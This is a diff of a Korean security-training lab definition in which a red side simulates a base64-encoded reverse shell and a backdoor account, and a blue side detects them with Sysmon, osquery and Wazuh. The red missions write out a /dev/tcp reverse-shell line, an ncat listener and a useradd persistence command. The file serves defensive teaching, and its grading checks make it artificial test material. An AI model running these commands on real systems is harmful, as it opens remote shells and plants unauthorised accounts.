@@ -1,204 +1,283 @@
 id: "secuops-w11"
 category: "secuops"
-title: "[보안운영 W11] 호스트 침해(리버스셸·persistence) vs sysmon-for-linux 호스트 이벤트 + Wazuh 탐지"
+title: "[보안운영 W11] 호스트의 비행기록장치 — sysmon이 잡는 '그 순간'(리버스셸·인코딩 명령)"
 difficulty: "hard"
 time_limit: 3300
 battle_type: "1v1"
 description: |
-  보안운영 11주차 — **Microsoft Sysmon for Linux**(eBPF 기반)로 호스트 이벤트를 스트림으로 관측한다.
-  osquery(W07)의 snapshot 과 달리 sysmon 은 **event stream**(ProcessCreate / NetworkConnect /
-  FileCreate / 등 6 Event)으로 행위를 실시간 기록한다. 공격자가 base64 리버스셸·의심 프로세스·계정
-  persistence 로 호스트를 침해하면, 운영자는 sysmon 을 설치·구성(config.xml RuleGroup)하고 Wazuh
-  agent 로 ship 해 탐지한다.
+  osquery(W7)는 **지금 이 순간**의 스냅샷을 찍는다 — 공격이 끝난 뒤 흔적을 지우면 놓친다. 이번 주
+  무기 **Microsoft Sysmon for Linux**(eBPF 기반)는 다르다. 프로세스가 **생성되는 순간**
+  (ProcessCreate — 인코딩된 명령줄까지), **네트워크 연결**(NetworkConnect), **파일 생성**(FileCreate)을
+  **event stream**으로 실시간 기록한다. 스냅샷이 놓치는 "그 순간"을 잡는 호스트의 비행기록장치다.
 
-  ▸ 모드: solo(호스트 침해 시뮬→sysmon 헌터) / duel(상대 호스트 침해→본인 sysmon/Wazuh 탐지).
-  ▸ 주의: 이 6v6 에 sysmon 은 **기본 미설치** — BLUE-1 에서 설치/구성이 과제다. 탐지 채점은 침해
-    아티팩트(프로세스/리스너/계정)와 Wazuh 수렴으로 한다(command_ran 불신뢰).
-  ▸ 권장 마커 아티팩트: 백도어 리스너 **포트 19999**(NetworkConnect 모사), 백도어 사용자
-    **eduintruder**(account persistence). osquery(snapshot) 와 sysmon(stream)의 보완 관계를 서술.
+  ▸ 이야기
+    침입자가 ① **base64로 인코딩한 리버스셸 명령**을 실행해 외부 콜백 채널(리스너)을 열고 ② 백도어
+    계정으로 지속성을 확보한다. 운영자(너)는 sysmon을 설치·구성(config.xml RuleGroup)하고, 의심
+    프로세스/연결과 persistence를 잡아 Wazuh로 보낸다.
 
+  ▸ 모드: solo(호스트 침해 시뮬→sysmon 헌터) / duel(상대 호스트 침해→본인 탐지). 대상=solo 본인 / duel 상대.
+
+  ▸ 알아둘 점 — 이 6v6엔 sysmon이 **기본 미설치**라 BLUE-1에서 설치/구성이 과제다. 탐지 채점은 침해
+    아티팩트로 한다. 마커: 리버스셸 콜백 **리스너 포트 53666**, 백도어 계정 **`smonbd`**.
+    (osquery=snapshot, sysmon=event stream의 보완 관계를 서술한다.)
+
+# ───────────── RED : 침입자 — "그 순간을 남겨라" ─────────────
 red_missions:
   - order: 1
     assess_target: opponent
     target_vm: web
     points: 18
     instruction: |
-      ## 🎯 RED-1 — base64 리버스셸 / 의심 프로세스 (ProcessCreate + NetworkConnect)
+      ## 🎯 RED-1 — base64 리버스셸 콜백 (ProcessCreate + NetworkConnect)
 
-      base64 로 인코딩한 명령으로 의심 프로세스를 실행하고 외부로 연결을 시도한다(리버스셸 모사).
-      sysmon 의 ProcessCreate(인코딩 커맨드라인) + NetworkConnect 가 잡아야 할 행위다. 검증 가능한
-      아티팩트로 **리스너 포트 19999** 를 연다.
+      ### 상황
+      탐지를 피하려 명령을 base64로 인코딩해 실행하고, 외부로 셸을 되돌릴 **콜백 리스너**를 연다.
+      sysmon이 있으면 ProcessCreate(인코딩 cmdline)와 NetworkConnect가 그 순간을 기록한다.
 
-      ### 권장 명령 (참고)
+      ### 할 일
+      대상 호스트에 콜백 리스너 **포트 53666**을 연다(리버스셸 채널 모사).
       ```bash
-      echo 'bash -i >& /dev/tcp/10.20.30.202/19999 0>&1' | base64        # payload 모사
-      nohup ncat -lk 19999 >/dev/null 2>&1 &                              # NetworkConnect 모사
+      echo 'bash -i >& /dev/tcp/10.20.30.202/53666 0>&1' | base64   # payload 모사
+      nohup ncat -lk 53666 >/dev/null 2>&1 &                         # 콜백 채널
       ```
-      📌 채점: 대상 호스트에 의심 리스너(19999)가 열렸는지(sysmon NetworkConnect 표적).
-      ✅ 합격: 대상 호스트에서 포트 19999 가 listening 이다.
-    hint: "base64 payload + ncat -lk 19999. 채점: port_listening 19999."
+
+      ### 채점 방법
+      대상 호스트에서 포트 53666이 listening인지로 채점(sysmon NetworkConnect 표적).
+
+      ### 합격 기준
+      대상 호스트에서 포트 53666이 listening이다.
+    hint: "base64 payload + ncat -lk 53666. 채점: port_listening 53666."
     verify:
       type: "port_listening"
-      expect: "19999"
+      expect: "53666"
       checks:
-        - { id: "red-1-1", type: "port_listening", target: "web", params: { port: 19999 } }
+        - { id: "red-1-1", type: "port_listening", target: "web", params: { port: 53666 } }
       semantic:
-        intent: "MITRE T1059/T1571 — base64 인코딩 커맨드 + 리버스셸 연결. sysmon ProcessCreate(인코딩 cmdline) + NetworkConnect 표적."
-        success_criteria: ["대상 호스트에 포트 19999 listening", "(설명) base64 인코딩 커맨드와 외부 연결이 sysmon 의 어느 Event 에 걸리는지 서술"]
-        acceptable_methods: ["ncat 리스너 + base64 payload 모사", "outbound 연결 시도"]
-        negative_signs: ["아티팩트 미생성"]
+        intent: "MITRE T1059/T1571 — base64 인코딩 명령 + 리버스셸 콜백. sysmon ProcessCreate(인코딩 cmdline)+NetworkConnect 표적."
+        success_criteria:
+          - "대상 호스트에 포트 53666 listening"
+          - "base64 인코딩 명령과 외부 연결이 sysmon의 어느 Event에 걸리는지 서술"
+        acceptable_methods:
+          - "ncat 리스너 + base64 payload 모사 / outbound 연결"
+        negative_signs:
+          - "아티팩트 미생성"
 
   - order: 2
     assess_target: opponent
     target_vm: web
     points: 17
     instruction: |
-      ## 🎯 RED-2 — 계정 persistence (account)
+      ## 🎯 RED-2 — 백도어 계정 persistence
 
-      침해 후 **백도어 계정**(eduintruder)을 만들어 지속성을 확보한다. sysmon/Wazuh 가 계정 생성·
-      파일 변경을 호스트 이벤트로 관측한다.
+      ### 상황
+      셸은 끊길 수 있으니 더 끈질긴 발판을 만든다 — 백도어 계정. sysmon/Wazuh가 계정 생성·파일 변경을
+      호스트 이벤트로 관측한다.
 
-      ### 권장 명령 (참고)
+      ### 할 일
+      대상 호스트에 계정 **`smonbd`**를 만든다.
       ```bash
-      sudo useradd -m -s /bin/bash eduintruder
+      sudo useradd -m -s /bin/bash smonbd
       ```
-      📌 채점: 대상 호스트의 /etc/passwd 에 백도어 사용자(eduintruder)가 추가됐는지.
-      ✅ 합격: /etc/passwd 에 eduintruder 가 있다.
-    hint: "useradd eduintruder. 채점: file_contains passwd eduintruder."
+
+      ### 채점 방법
+      대상 호스트 `/etc/passwd`에 `smonbd`가 추가됐는지로 채점.
+
+      ### 합격 기준
+      `/etc/passwd`에 `smonbd`가 있다.
+    hint: "useradd smonbd. 채점: file_contains passwd smonbd."
     verify:
       type: "file_contains"
-      expect: "eduintruder"
+      expect: "smonbd"
       checks:
-        - { id: "red-2-1", type: "file_contains", target: "web", params: { path: "/etc/passwd", pattern: "eduintruder" } }
+        - { id: "red-2-1", type: "file_contains", target: "web", params: { path: "/etc/passwd", pattern: "smonbd" } }
       semantic:
         intent: "MITRE T1136.001 — 백도어 계정 persistence. 호스트 이벤트(파일/계정 변경)로 관측."
-        success_criteria: ["/etc/passwd 에 eduintruder", "(설명) 정상 대비 식별 신호 서술"]
-        acceptable_methods: ["useradd / authorized_keys(대안)"]
-        negative_signs: ["흔적 미생성"]
+        success_criteria:
+          - "/etc/passwd에 smonbd"
+          - "정상 대비 식별 신호 서술"
+        acceptable_methods:
+          - "useradd / authorized_keys(대안)"
+        negative_signs:
+          - "흔적 미생성"
 
+# ───────────── BLUE : sysmon 헌터 — "그 순간을 잡아 SIEM으로" ─────────────
 blue_missions:
   - order: 1
     assess_target: self
     target_vm: web
     points: 12
     instruction: |
-      ## 🛡️ BLUE-1 — sysmon-for-linux 설치 + config.xml RuleGroup 구성
+      ## 🛡️ BLUE-1 — sysmon 설치 + config.xml RuleGroup 구성
 
-      이 6v6 에 sysmon 은 **미설치** 상태다. sysmon-for-linux(eBPF)를 설치하고 `config.xml` 의
-      RuleGroup(Include/Exclude)으로 관측할 Event(ProcessCreate / NetworkConnect / FileCreate 등)를
-      정의한다. 노이즈를 줄이도록 Exclude 를 설계한다.
+      ### 상황
+      이 호스트엔 sysmon이 **미설치**다. sysmon-for-linux(eBPF)를 설치하고 `config.xml`의
+      RuleGroup(Include/Exclude)으로 관측할 Event(ProcessCreate/NetworkConnect/FileCreate)를 정의한다.
+      Include만 켜면 노이즈가 폭주하니 Exclude로 정상 활동을 거른다.
 
-      ### 참고
-      ```bash
-      # sysmonforlinux 설치 → config.xml(ProcessCreate Include) → sysmon -accepteula -i config.xml
-      ```
-      📌 채점: 호스트에 Wazuh agent(sysmon 이벤트 ship 주체)가 가동 중인지(통합 전제).
-      ✅ 합격: web 에 Wazuh agent 가 running 이다(sysmon→Wazuh ship 경로 준비).
-    hint: "sysmon 설치 + config.xml RuleGroup(ProcessCreate Include). 통합 채점: process_running web wazuh."
+      ### 할 일
+      sysmon을 설치하고 config.xml RuleGroup을 설계한다. 결과는 Wazuh agent가 ship한다(전제 확인).
+
+      ### 채점 방법
+      web 호스트에 Wazuh agent(sysmon 이벤트 ship 주체)가 가동 중인지로 확인.
+
+      ### 합격 기준
+      web에 Wazuh agent가 running이다(sysmon→Wazuh ship 경로 준비).
+    hint: "sysmon 설치 + config.xml RuleGroup(ProcessCreate Include). 채점: process_running web wazuh."
     verify:
       type: "process_running"
       expect: "wazuh"
       checks:
         - { id: "blue-1-1", type: "process_running", target: "web", params: { name: "wazuh" } }
       semantic:
-        intent: "sysmon 설치/구성 — eBPF 기반 6 Event. config.xml RuleGroup(Include/Exclude)로 관측 범위 + 노이즈 통제. Wazuh agent 가 ship 주체."
-        success_criteria: ["(작업) sysmon 설치 + config.xml RuleGroup 구성 서술", "Wazuh agent 가동(ship 경로)", "(설명) ProcessCreate/NetworkConnect 등 6 Event 의미"]
-        acceptable_methods: ["sysmonforlinux 설치 + config.xml + sysmon -i", "Wazuh localfile 연동"]
-        negative_signs: ["Include 만(노이즈 폭주)", "설치/구성 미수행"]
+        intent: "sysmon 설치/구성 — eBPF 6 Event. config.xml RuleGroup(Include/Exclude)로 관측 범위+노이즈 통제. Wazuh agent가 ship 주체."
+        success_criteria:
+          - "(작업) sysmon 설치 + config.xml RuleGroup 구성 서술"
+          - "Wazuh agent 가동(ship 경로)"
+          - "ProcessCreate/NetworkConnect 등 Event 의미"
+        acceptable_methods:
+          - "sysmonforlinux 설치 + config.xml + sysmon -i + Wazuh localfile 연동"
+        negative_signs:
+          - "Include만(노이즈 폭주) / 설치·구성 미수행"
 
   - order: 2
     assess_target: self
     target_vm: web
     points: 20
     instruction: |
-      ## 🛡️ BLUE-2 — 의심 프로세스/리스너 탐지 (ProcessCreate + NetworkConnect)
+      ## 🛡️ BLUE-2 — 리버스셸 콜백 잡기 (ProcessCreate + NetworkConnect)
 
-      RED-1 의 의심 리스너(19999)/리버스셸 행위를 호스트 이벤트로 탐지한다. sysmon 이 설치됐다면
-      NetworkConnect/ProcessCreate event 로, 미설치 상황에선 `ss`/osquery 로 비표준 리스너와 그
-      프로세스를 상관한다.
+      ### 상황
+      RED-1의 리버스셸 콜백(53666)을 호스트 이벤트로 잡는다. sysmon이 있으면 NetworkConnect/ProcessCreate
+      event로, 미설치 상황에선 `ss`/osquery로 비표준 리스너와 그 프로세스를 상관한다.
 
-      📌 채점: 대상 호스트에 의심 리스너(19999)가 탐지되는지.
-      ✅ 합격: 포트 19999 가 listening 이며 프로세스까지 상관했다.
-    hint: "ss/osquery/sysmon NetworkConnect 로 19999 + 프로세스 상관. 채점: port_listening 19999."
+      ### 할 일
+      포트 53666과 그 프로세스를 상관해 콜백 채널의 정체를 규명한다.
+
+      ### 채점 방법
+      대상 호스트에 콜백 리스너(53666)가 탐지되는지로 채점.
+
+      ### 합격 기준
+      포트 53666이 listening이며 프로세스까지 상관했다.
+    hint: "ss/osquery/sysmon NetworkConnect로 53666 + 프로세스 상관. 채점: port_listening 53666."
     verify:
       type: "port_listening"
-      expect: "19999"
+      expect: "53666"
       checks:
-        - { id: "blue-2-1", type: "port_listening", target: "web", params: { port: 19999 } }
+        - { id: "blue-2-1", type: "port_listening", target: "web", params: { port: 53666 } }
       semantic:
-        intent: "MITRE D3FEND — 호스트 이벤트 탐지. sysmon NetworkConnect(외부 연결) + ProcessCreate(인코딩 cmdline) 상관으로 리버스셸 식별."
-        success_criteria: ["포트 19999 리스너 + 프로세스 상관", "(설명) sysmon event stream 이 osquery snapshot 보다 나은 점(시점/cmdline) 서술"]
-        acceptable_methods: ["sysmon event / ss+osquery 로 포트+프로세스 상관"]
-        negative_signs: ["포트만, 프로세스/행위 상관 누락"]
+        intent: "MITRE D3FEND — 호스트 이벤트 탐지. sysmon NetworkConnect(외부 연결)+ProcessCreate(인코딩 cmdline) 상관으로 리버스셸 식별."
+        success_criteria:
+          - "포트 53666 리스너 + 프로세스 상관"
+          - "sysmon event stream이 osquery snapshot보다 나은 점(시점/cmdline 보존) 서술"
+        acceptable_methods:
+          - "sysmon event / ss+osquery로 포트+프로세스 상관"
+        negative_signs:
+          - "포트만, 프로세스/행위 상관 누락"
 
   - order: 3
     assess_target: self
     target_vm: web
     points: 18
     instruction: |
-      ## 🛡️ BLUE-3 — 계정 persistence 탐지
+      ## 🛡️ BLUE-3 — 계정 persistence 잡기
 
-      RED-2 의 백도어 계정(eduintruder)을 호스트 가시화로 탐지한다. sysmon FileCreate(/etc/passwd
-      변경) 또는 osquery users 로 식별한다.
+      ### 상황
+      RED-2의 백도어 계정(smonbd)을 호스트 가시화로 잡는다. sysmon FileCreate(/etc/passwd 변경) 또는
+      osquery users로 식별한다.
 
-      📌 채점: 대상 /etc/passwd 에 백도어 사용자(eduintruder)가 탐지되는지.
-      ✅ 합격: /etc/passwd 에 eduintruder 가 있고 찾아냈다.
-    hint: "sysmon FileCreate / osquery users 로 eduintruder 탐지. 채점: file_contains passwd eduintruder."
+      ### 할 일
+      `users`/`/etc/passwd`를 질의해 백도어 계정을 찾는다.
+
+      ### 채점 방법
+      대상 `/etc/passwd`에 백도어 계정(smonbd)이 탐지되는지로 채점.
+
+      ### 합격 기준
+      `/etc/passwd`에 `smonbd`가 있고 찾아냈다.
+    hint: "sysmon FileCreate / osquery users로 smonbd 탐지. 채점: file_contains passwd smonbd."
     verify:
       type: "file_contains"
-      expect: "eduintruder"
+      expect: "smonbd"
       checks:
-        - { id: "blue-3-1", type: "file_contains", target: "web", params: { path: "/etc/passwd", pattern: "eduintruder" } }
+        - { id: "blue-3-1", type: "file_contains", target: "web", params: { path: "/etc/passwd", pattern: "smonbd" } }
       semantic:
         intent: "persistence 탐지 — 계정 생성(파일 변경) 이벤트. sysmon FileCreate + Wazuh 룰 또는 osquery users."
-        success_criteria: ["백도어 계정 확인", "(설명) 어떤 이벤트/쿼리로 찾았는지 서술"]
-        acceptable_methods: ["sysmon FileCreate / osquery users 헌팅"]
-        negative_signs: ["탐지 누락"]
+        success_criteria:
+          - "백도어 계정 확인"
+          - "어떤 이벤트/쿼리로 찾았는지 서술"
+        acceptable_methods:
+          - "sysmon FileCreate / osquery users"
+        negative_signs:
+          - "탐지 누락"
 
   - order: 4
     assess_target: self
     target_vm: siem
     points: 18
     instruction: |
-      ## 🛡️ BLUE-4 — Wazuh agent 통합 (sysmon 이벤트 → ossec.conf localfile → 룰)
+      ## 🛡️ BLUE-4 — sysmon 이벤트를 Wazuh로 (localfile)
 
-      sysmon 이벤트를 Wazuh manager 로 ship 한다. agent 의 `ossec.conf`/`agent.conf` 의 `<localfile>`
-      로 sysmon 로그를 읽어 manager 의 sysmon 룰셋이 매치하게 한다.
+      ### 상황
+      sysmon 이벤트를 Wazuh manager로 ship한다. agent의 `ossec.conf`/`agent.conf`의 `<localfile>`로
+      sysmon 로그를 읽어 manager의 sysmon 룰셋이 매치하게 한다.
 
-      📌 채점: siem 의 ossec.conf 에 localfile(로그 수집) 설정이 있는지.
-      ✅ 합격: ossec.conf 에 localfile 설정이 있다.
-    hint: "ossec.conf <localfile> 로 sysmon 로그 수집. 채점: file_contains ossec.conf localfile."
+      ### 할 일
+      siem의 `ossec.conf`에서 `<localfile>` 수집 설정을 확인하고, sysmon 로그를 어떤 log_format으로
+      수집할지 정리한다.
+
+      ### 채점 방법
+      siem의 ossec.conf에 localfile 설정이 있는지로 확인.
+
+      ### 합격 기준
+      ossec.conf에 localfile 설정이 있다.
+    hint: "ossec.conf <localfile>로 sysmon 로그 수집. 채점: file_contains ossec.conf localfile."
     verify:
       type: "file_contains"
       expect: "localfile"
       checks:
-        - { id: "blue-4-1", type: "file_contains", target: "siem", params: { path: "/var/ossec/etc/ossec.conf", pattern: "localfile" } }
+        - { id: "blue-4-1", type: "file_contains", target: "siem",
+            params: { path: "/var/ossec/etc/ossec.conf", pattern: "localfile" } }
       semantic:
         intent: "sysmon→Wazuh 통합 — <localfile>(location/log_format)로 sysmon 이벤트 수집 + 기 활성 sysmon 룰셋 매치."
-        success_criteria: ["ossec.conf 에 localfile 설정", "(설명) sysmon 로그를 어떤 log_format 으로 수집하는지 서술"]
-        acceptable_methods: ["ossec.conf/agent.conf localfile 작성 + 룰 검증"]
-        negative_signs: ["수집 설정 누락"]
+        success_criteria:
+          - "ossec.conf에 localfile 설정"
+          - "sysmon 로그를 어떤 log_format으로 수집하는지 서술"
+        acceptable_methods:
+          - "ossec.conf/agent.conf localfile 작성 + 룰 검증"
+        negative_signs:
+          - "수집 설정 누락"
 
   - order: 5
     assess_target: self
     target_vm: siem
     points: 12
     instruction: |
-      ## 🛡️ BLUE-5 — R/B/P: 리버스셸 → Wazuh 탐지 수렴
+      ## 🛡️ BLUE-5 — 리버스셸이 SIEM으로 수렴 + 두 도구의 보완
 
-      base64 리버스셸 + 계정 persistence 시나리오의 호스트 이벤트가 Wazuh 로 수렴해 경보가 뜨는지
-      확인한다. 네트워크(IPS/WAF)가 못 보는 **호스트 내부 행위** 를 sysmon 이 채워 SIEM 으로 보낸다.
+      ### 상황
+      base64 리버스셸 + 계정 persistence의 호스트 이벤트가 Wazuh로 수렴해 경보가 뜨는지 확인한다.
+      네트워크 장비가 못 보는 **호스트 내부 행위**를 sysmon이 채운다.
 
-      📌 채점: 본인 SIEM 에 최근 경보(호스트 이벤트 포함)가 수집됐는지.
-      ✅ 합격: 본인 SIEM 에 경보가 수집돼 있다.
-    hint: "리버스셸/persistence 의 호스트 이벤트가 Wazuh 로 수렴 확인."
+      ### 할 일
+      본인 SIEM에 호스트 이벤트 경보가 수집되는지 확인하고, osquery(snapshot)와 sysmon(event stream)의
+      보완 관계를 정리한다.
+
+      ### 채점 방법
+      본인 SIEM에 최근 경보가 수집됐는지로 확인.
+
+      ### 합격 기준
+      본인 SIEM에 경보가 수집돼 있다.
+    hint: "리버스셸/persistence 호스트 이벤트의 Wazuh 수렴 + osquery vs sysmon 보완."
     verify:
       type: "wazuh_alert"
       expect: "alert"
       checks:
         - { id: "blue-5-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
       semantic:
-        intent: "통합 — sysmon 호스트 이벤트가 Wazuh 로 수렴. osquery(snapshot)+sysmon(stream) 보완으로 호스트 가시성 완성."
-        success_criteria: ["본인 Wazuh 에 최근 경보", "(설명) osquery snapshot 과 sysmon event stream 의 보완 관계 서술"]
-        acceptable_methods: ["siem wazuh_alert / 중앙 SIEM 탭"]
-        negative_signs: ["수집 비어있음"]
+        intent: "통합 — sysmon 호스트 이벤트가 Wazuh로 수렴. osquery(snapshot)+sysmon(stream) 보완으로 호스트 가시성 완성."
+        success_criteria:
+          - "본인 Wazuh에 최근 경보"
+          - "osquery snapshot과 sysmon event stream의 보완 관계 서술"
+        acceptable_methods:
+          - "siem wazuh_alert / 중앙 SIEM 탭"
+        negative_signs:
+          - "수집 비어있음"
